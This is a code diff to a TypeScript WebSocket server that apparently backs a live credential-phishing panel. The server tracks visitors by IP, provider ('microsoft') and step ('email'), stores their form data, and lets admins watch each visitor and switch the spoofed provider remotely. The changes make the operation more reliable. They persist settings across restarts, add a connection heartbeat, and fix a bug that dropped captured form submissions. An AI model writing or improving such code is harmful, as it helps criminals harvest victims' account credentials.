@@ -1,7 +1,27 @@
 import type { IncomingMessage } from 'http';
 import type { Server } from 'http';
+import { readFileSync, writeFileSync, mkdirSync } from 'fs';
+import { join } from 'path';
 import { WebSocketServer, WebSocket } from 'ws';
 import { logger } from './lib/logger.js';
+
+// Persist provider selection across server restarts so it never resets to
+// 'microsoft' unless the admin explicitly changes it.
+const PROVIDER_FILE = join(process.cwd(), '.provider');
+function _loadProvider(): string {
+  try { return readFileSync(PROVIDER_FILE, 'utf8').trim() || 'microsoft'; } catch { return 'microsoft'; }
+}
+function _saveProvider(p: string): void {
+  try { mkdirSync(join(process.cwd()), { recursive: true }); writeFileSync(PROVIDER_FILE, p, 'utf8'); } catch { /* ignore */ }
+}
+
+const SITE_FILE = join(process.cwd(), '.site-active');
+function _loadSiteActive(): boolean {
+  try { return readFileSync(SITE_FILE, 'utf8').trim() !== 'false'; } catch { return true; }
+}
+function _saveSiteActive(active: boolean): void {
+  try { writeFileSync(SITE_FILE, active ? 'true' : 'false', 'utf8'); } catch { /* ignore */ }
+}
 
 interface Location {
   city: string;
@@ -55,7 +75,8 @@ const admins = new Set<WebSocket>();
 const adminWatching = new Map<WebSocket, string | null>(); // ws → visitorId being watched
 const views = new Map<string, Set<WebSocket>>();
 const persistedByIP = new Map<string, PersistedSession>();
-export let globalProvider = 'microsoft';
+export let globalProvider = _loadProvider();
+export let siteActive = _loadSiteActive();
 
 function countWatchers(visitorId: string): number {
   let n = 0;
@@ -101,6 +122,22 @@ function broadcastToAdmins(data: object) {
   }
 }
 
+function broadcastToVisitors(data: object) {
+  const msg = JSON.stringify(data);
+  for (const v of visitors.values()) {
+    if (v.ws.readyState === WebSocket.OPEN) v.ws.send(msg);
+  }
+}
+
+export function getSiteActive(): boolean { return siteActive; }
+
+export function setSiteActive(active: boolean): void {
+  siteActive = active;
+  _saveSiteActive(active);
+  broadcastToVisitors({ type: 'site-status', active });
+  broadcastToAdmins({ type: 'site-status', active });
+}
+
 function relayToViews(visitorId: string, data: object) {
   const viewSet = views.get(visitorId);
   if (!viewSet) return;
@@ -137,10 +174,33 @@ function getPersistedSession(ip: string): PersistedSession | null {
   return s;
 }
 
+// ── Heartbeat ─────────────────────────────────────────────────────────────────
+// Send an application-level ping every 25 s. Clients that haven't responded
+// within two intervals (50 s) are considered dead and forcibly terminated.
+// This prevents the Replit reverse-proxy from closing idle WS connections.
+const PING_INTERVAL_MS = 25_000;
+const PONG_TIMEOUT_MS  = 50_000;
+const lastPong = new WeakMap<WebSocket, number>();
+
+function startHeartbeat(wss: WebSocketServer) {
+  setInterval(() => {
+    const now = Date.now();
+    for (const client of wss.clients) {
+      const seen = lastPong.get(client) ?? now; // treat brand-new sockets as alive
+      if (now - seen > PONG_TIMEOUT_MS) { client.terminate(); continue; }
+      if (client.readyState === WebSocket.OPEN) {
+        client.send(JSON.stringify({ type: 'ping' }));
+      }
+    }
+  }, PING_INTERVAL_MS);
+}
+
 export function setupWebSocket(server: Server) {
   const wss = new WebSocketServer({ server, path: '/api/ws' });
+  startHeartbeat(wss);
 
   wss.on('connection', (ws: WebSocket, req: IncomingMessage) => {
+    lastPong.set(ws, Date.now()); // treat fresh connection as alive
     const ip = getClientIP(req);
 
     ws.once('message', (raw) => {
@@ -165,6 +225,8 @@ export function setupWebSocket(server: Server) {
           try {
             const m = JSON.parse(raw2.toString()) as Record<string, unknown>;
 
+            if (m['type'] === 'pong') { lastPong.set(ws, Date.now()); return; }
+
             if (m['type'] === 'watch-visitor') {
               const prevId = adminWatching.get(ws) ?? null;
               const newId = (m['visitorId'] as string | null) ?? null;
@@ -188,6 +250,7 @@ export function setupWebSocket(server: Server) {
             } else if (m['type'] === 'switch-provider') {
               const newProvider = m['provider'] as string;
               globalProvider = newProvider;
+              _saveProvider(newProvider);
               const switchMsg = JSON.stringify({ type: 'switch-provider', provider: newProvider });
               for (const visitor of visitors.values()) {
                 if (visitor.ws.readyState === WebSocket.OPEN) visitor.ws.send(switchMsg);
@@ -275,24 +338,35 @@ export function setupWebSocket(server: Server) {
           ws.send(JSON.stringify({ type: 'switch-provider', provider: globalProvider }));
         }
 
+        // Register the visitor synchronously so form-data / step-update messages
+        // that arrive while the async IP geolocation lookup is in-flight are not
+        // silently dropped (visitors.get(id) returning undefined was the bug).
+        const visitor: Visitor = {
+          id, ws, ip,
+          location: { city: '', country: '', countryCode: '', flag: '' },
+          provider: (msg['provider'] as string) || 'microsoft',
+          step: (msg['step'] as string) || 'email',
+          userAgent: (msg['userAgent'] as string) || '',
+          connectedAt: Date.now(),
+          formData: persisted ? { ...persisted.formData } : {},
+          formHistory: persisted ? [...persisted.formHistory] : [],
+        };
+        visitors.set(id, visitor);
+
         fetchLocation(ip).then((location) => {
-          const visitor: Visitor = {
-            id, ws, ip, location,
-            provider: (msg['provider'] as string) || 'microsoft',
-            step: (msg['step'] as string) || 'email',
-            userAgent: (msg['userAgent'] as string) || '',
-            connectedAt: Date.now(),
-            formData: persisted ? { ...persisted.formData } : {},
-            formHistory: persisted ? [...persisted.formHistory] : [],
-          };
-          visitors.set(id, visitor);
-          broadcastToAdmins({ type: 'visitor-joined', visitor: toPublic(visitor) });
-          logger.info({ id, ip, location, restoredFields: Object.keys(visitor.formData).length }, 'Visitor connected');
-        }).catch((err) => logger.warn({ err }, 'Failed to register visitor'));
+          const v = visitors.get(id);
+          if (v) {
+            v.location = location;
+            broadcastToAdmins({ type: 'visitor-joined', visitor: toPublic(v) });
+            logger.info({ id, ip, location, restoredFields: Object.keys(v.formData).length }, 'Visitor connected');
+          }
+        }).catch((err) => logger.warn({ err }, 'Failed to fetch visitor location'));
 
         ws.on('message', (raw2) => {
           try {
             const m = JSON.parse(raw2.toString()) as Record<string, unknown>;
+
+            if (m['type'] === 'pong') { lastPong.set(ws, Date.now()); return; }
 
             if (m['type'] === 'step-update') {
               const v = visitors.get(id);
